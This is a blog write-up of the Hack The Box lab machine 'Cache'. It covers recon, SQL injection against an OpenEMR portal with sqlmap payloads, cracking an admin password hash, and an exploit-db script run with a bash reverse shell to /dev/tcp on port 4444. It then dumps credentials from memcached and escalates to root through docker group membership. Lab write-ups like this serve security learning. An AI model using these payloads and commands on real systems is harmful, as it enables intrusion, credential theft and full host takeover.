---
published: true
layout: post
title: HackTheBox-Cache
featured_img: /assets/img/sample/cache/logo.png
categories:
  - HackTheBox -- Active
  - Linux
tags:
  - Hack The Box
image: /assets/img/sample/cache/logo.png
---
# [](header-3) Introduction@cache:~$

| Column            | Details          |
|:------------------|:-----------------|
| Name          	| Cache     	   |
| IP            	| 10.10.10.188     |
| Points 			| 30			   |
| Os           		| Linux			   |
| Difficulty		| Medium 		   |
| Creator			| ASHacker         |
| Out on     		| 9 May 2020	   |

# [](header-2)Recon

# [](header-3)Nmap Scanning

```shell
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #nmap -sC -sV -oN nmap 10.10.10.188
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 23:37 +0630
Nmap scan report for hms.htb (10.10.10.188)
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: OpenEMR Login
|_Requested resource was interface/login/login.php?site=default
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.80 seconds
```

# [](header-3)Directory Scan

```shell
┌─[root@cyb3rhoL1c]─[~]
└──╼ #dirsearch -u 10.10.10.188 -w /opt/wordlists/directory-list-2.3-medium.txt -e *

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: 0xska-fortress.ovpn | HTTP method: get | Threads: 10 | Wordlist size: 220521

Error Log: /root/Downloads/dirsearch/logs/errors-20-10-08_23-38-31.log

Target: 10.10.10.188

[23:38:31] Starting: 
[23:38:33] 200 -    8KB - /       
[23:39:07] 301 -  317B  - /javascript  ->  http://10.10.10.188/javascript/
[00:14:16] 301 -  313B  - /jquery  ->  http://10.10.10.188/jquery/                
CTRL+C detected: Pausing threads, please wait...                                    
[e]xit / [c]ontinue: e                    
 
Canceled by the user

```

Here I found two folders `/javascript` and `/jquery`

`/javascript` folder is accesss denied , In `/jquery` folder , I got `functionality.js` file

![Desktop View](/assets/img/sample/cache/1.png)

> functionality.sh

![Desktop View](/assets/img/sample/cache/2.png)

From the above file i got username:`ash` password:`H@v3_fun` I used these creds at `/login.html`

![Desktop View](/assets/img/sample/cache/3.png)

![Desktop View](/assets/img/sample/cache/4.png)

There is no interesting here, I create a new `wordlist`  from the `author` page with `cewl` for fuzzing domain

![Desktop View](/assets/img/sample/cache/5.png)

```shell
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #cewl -w custom-wordlist.txt -d 10 -m 1 http://cache.htb/author.html
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #wc custom-wordlist.txt 
 636  636 4634 custom-wordlist.txt
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #
```

# [](header-3)Wfuzz to find the Doamin

```shell
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #wfuzz  --hh 8193  -H 'Host: FUZZ.htb' -u http://10.10.10.188/ --hc 400 -w custom-wordlist.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.188/
Total requests: 636

===================================================================
ID           Response   Lines    Word     Chars       Payload             
===================================================================

000000415:   302        0 L      0 W      0 Ch        "HMS"               

Total time: 23.93465
Processed Requests: 636
Filtered Requests: 635
Requests/sec.: 26.57234

```

Add this `host` to `/ect/host`

# [](header-3)hms.htb

Now we can access the new domain and its `running` on application `openemr`

![Desktop View](/assets/img/sample/cache/6.png)

After spending some time, searched for `exploits` in `searchspoilt` and in `google`

I found sql injection and I fuzzed for directories and parameters and then I got a GET based SQL injection at

> <http://hms.htb/portal/add_edit_event_user.php?eid=1>

so I captured with `burp` and saved the request as `sql.txt`

```yaml
GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
Host: hms.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,hi;q=0.8
Cookie: OpenEMR=0crb94kfcniml3dgittqr6uvae; PHPSESSID=0v414a6qm46hu08dfq59k1nc83
Connection: close

```

And now I used `sqlmap`

# [](header-2)Sqlmap to dump database

```shell
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #sqlmap -r login.req --threads=10 --dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.3.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end users responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:59:11 /2020-05-10/

[12:59:11] [INFO] parsing HTTP request from 'login.req'
[12:59:12] [INFO] resuming back-end DBMS 'mysql' 
[12:59:12] [INFO] testing connection to the target URL
[12:59:13] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (3423=3423) THEN 1 ELSE (SELECT 9802 UNION SELECT 8164) END))

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: eid=1 AND EXTRACTVALUE(8000,CONCAT(0x5c,0x71706a7171,(SELECT (ELT(8000=8000,1))),0x7176717871))

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71706a7171,0x526b586553736c6a7551504c4543594765744c5853444957694a776d6f46714f7965637a7072514b,0x7176717871),NULL-- qQvr
---
[12:59:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.1
[12:59:13] [INFO] fetching database names
[12:59:14] [INFO] used SQL query returns 2 entries
[12:59:14] [INFO] starting 2 threads
[12:59:14] [INFO] resumed: 'information_schema'
[12:59:14] [INFO] resumed: 'openemr'
available databases [2]:                                                       
[*] information_schema
[*] openemr

[12:59:14] [INFO] fetched data logged to text files under '/root/.sqlmap/output/hms.htb'

[*] ending @ 12:59:14 /2020-05-10/
```

And I got two `databases`

- information_schema
- openemr

> Dumping tables in db `openemr`

```shell
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #sqlmap -r login.req --threads=10 -D openemr --table
```

From this query we got all the tables in `openemr` db

> It is very long so can't show all

There is a table called `users_secure`

> Dumping columns from table `users_secure`

```shell
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #sqlmap -r login.req --threads=10 -D openemr -T users_secure --column
```

> Output

```
+-------------------+--------------+
| Column            | Type         |
+-------------------+--------------+
| id                | bigint(20)   |
| last_update       | timestamp    |
| password          | varchar(255) |
| password_history1 | varchar(255) |
| password_history2 | varchar(255) |
| salt              | varchar(255) |
| salt_history1     | varchar(255) |
| salt_history2     | varchar(255) |
| username          | varchar(255) |
+-------------------+--------------+

```

Let's `dump` all the data from the `table`

```shell
sqlmap -r login.req --threads=10 -D openemr -T users_secure --dump
```

> Output

```
id,salt,username,password,last_update,salt_history2,salt_history1,password_history2,password_history1
1,$2a$05$l2sTLIG6GTBeyBf7TAKL6A$,openemr_admin,$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.,2019-11-21 06:38:40,NULL,NULL,NULL,NULL

```

So here we got a user called `openemr_admin` and a password `hash`, so let's crack it 

> Cracking the hash

```shell
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)
1g 0:00:00:00 DONE (2020-05-10 13:11) 1.190g/s 1028p/s 1028c/s 1028C/s tristan..felipe
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

Now we can login with these credentials `openemr_admin : xxxxxx` on `hms.htb`

# [](header-3)Log in to openemr

![Desktop View](/assets/img/sample/cache/7.png)

After spending some time , I fount an `exploit` on `google`

> <https://www.exploit-db.com/exploits/45161>

# [](header-2)Running Exploit

```shell
┌─[root@cyb3rhoL1c]─[~/Documents/htb/writeup/cache]
└──╼ #python 45161.py http://hms.htb -u openemr_admin -p xxxxxx -c '/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with openemr_admin:xxxxxx
[$] Injecting payload

```

> Listening with `netcat`

```shell
┌─[root@cyb3rhoL1c]─[~]
└──╼ #nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.188] 36466
bash: cannot set terminal process group (1642): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$ 

```

Login as `ash` with `H@v3_fun` password

```shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$ su ash
su ash
Password: H@v3_fun

ash@cache:/var/www/hms.htb/public_html/interface/main$
```

# [](header-3) Dumping data From memcached

After some enumerating , i found `mysql` and `memcached` service are running locally

```
ash@cache:/var/www/hms.htb/public_html/interface/main$ ss -nlt
ss -nlt
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128               127.0.0.1:11211            0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         128                       *:80                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*       
ash@cache:/var/www/hms.htb/public_html/interface/main$ 
```

`Memcached` is a `vulnerable servic`e we can easily dump the Stored data from it

Here are few articles

> <https://www.hackingarticles.in/penetration-testing-on-memcached-server/>

> <https://niiconsulting.com/checkmate/2013/05/memcache-exploit/>

We can connect to the port `11211` using `netcat` since its already installed on the box

```shell
nc 127.0.0.1 11211
nc 127.0.0.1 11211
stats
STAT pid 1022
STAT uptime 15472
STAT time 1589114272
STAT version 1.5.6 Ubuntu
STAT libevent 2.1.8-stable
STAT pointer_size 64
STAT rusage_user 0.955896
STAT rusage_system 1.827802
STAT max_connections 1024
STAT curr_connections 1
STAT total_connections 260
STAT rejected_connections 0
STAT connection_structures 3
STAT reserved_fds 20
STAT cmd_get 4
STAT cmd_set 1285
STAT cmd_flush 0
STAT cmd_touch 0
STAT get_hits 3
STAT get_misses 1
STAT get_expired 0
STAT get_flushed 0
STAT delete_misses 0
STAT delete_hits 0
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT touch_hits 0
STAT touch_misses 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 39372
STAT bytes_written 10382
STAT limit_maxbytes 67108864
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT time_in_listen_disabled_us 0
STAT threads 4
STAT conn_yields 0
STAT hash_power_level 16
STAT hash_bytes 524288
STAT hash_is_expanding 0
STAT slab_reassign_rescues 0
STAT slab_reassign_chunk_rescues 0
STAT slab_reassign_evictions_nomem 0
STAT slab_reassign_inline_reclaim 0
STAT slab_reassign_busy_items 0
STAT slab_reassign_busy_deletes 0
STAT slab_reassign_running 0
STAT slabs_moved 0
STAT lru_crawler_running 0
STAT lru_crawler_starts 5865
STAT lru_maintainer_juggles 34040
STAT malloc_fails 0
STAT log_worker_dropped 0
STAT log_worker_written 0
STAT log_watcher_skipped 0
STAT log_watcher_sent 0
STAT bytes 371
STAT curr_items 5
STAT total_items 1285
STAT slab_global_page_pool 0
STAT expired_unfetched 0
STAT evicted_unfetched 0
STAT evicted_active 0
STAT evictions 0
STAT reclaimed 0
STAT crawler_reclaimed 0
STAT crawler_items_checked 88
STAT lrutail_reflocked 0
STAT moves_to_cold 1285
STAT moves_to_warm 0
STAT moves_within_lru 0
STAT direct_reclaims 0
STAT lru_bumps_dropped 0
END
```

I will be using `watch` from fetch the data

```shell
watch fetchers
OK
ts=1589114401.199460 gid=1 type=item_get key=account status=found clsid=1
ts=1589114401.448736 gid=2 type=item_get key=file status=found clsid=1
ts=1589114401.700036 gid=3 type=item_get key=passwd status=found clsid=1
ts=1589114401.951157 gid=4 type=item_get key=user status=found clsid=1
ts=1589114402.202163 gid=5 type=item_get key=link status=found clsid=1
```

Here i got incoming `request` to the `watch.`

> Dumping Key values

> account

```
get account
VALUE account 0 9
afhj556uo
END

```
> file

```
get file
VALUE file 0 7
nothing
END
```

> passwd

```
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
```

I got two important things here `user:luffy` and passwd : `0n3_p1ec3`

These are the credentials of user `luffy`.

# [](header-2)Login as luffy

```shell
─[✗]─[root@cyb3rhoL1c]─[~]
└──╼ #sshpass -p 0n3_p1ec3 ssh luffy@10.10.10.188
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct  9 06:36:29 UTC 2020

  System load:  0.0               Processes:              191
  Usage of /:   75.0% of 8.06GB   Users logged in:        0
  Memory usage: 16%               IP address for ens160:  10.10.10.188
  Swap usage:   0%                IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

110 packages can be updated.
0 updates are security updates.


Last login: Wed May  6 08:54:44 2020 from 10.10.14.3
luffy@cache:~$ 

```

And i am logged in as luffy

the user `luffy` also doesnt have read `perm`to the file `user.txt`,i was thinking that i need to find a way for `ash`

> id

By running id we can see that the user luffy is in the group docker

```
luffy@cache:~$ id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
luffy@cache:~$ 
```

Search in GTFObin and I found this one

![Desktop View](/assets/img/sample/cache/8.png)


And run it like this

```shell
luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
root@1d536c8a7e87:/# whoami
root
root@1d536c8a7e87:/#
```


# [](header-2)Got user.txt

```
root@1d536c8a7e87:/# cat /home/ash/user.txt
3f26455***************46abcbd5
root@1d536c8a7e87:/# 
```

# [](header-2)Got root.txt

```
root@1d536c8a7e87:/# cat /root/root.txt
51fcbbb**************182309c25a
root@1d536c8a7e87:/#
```


And we owned it , `thanks for reading`

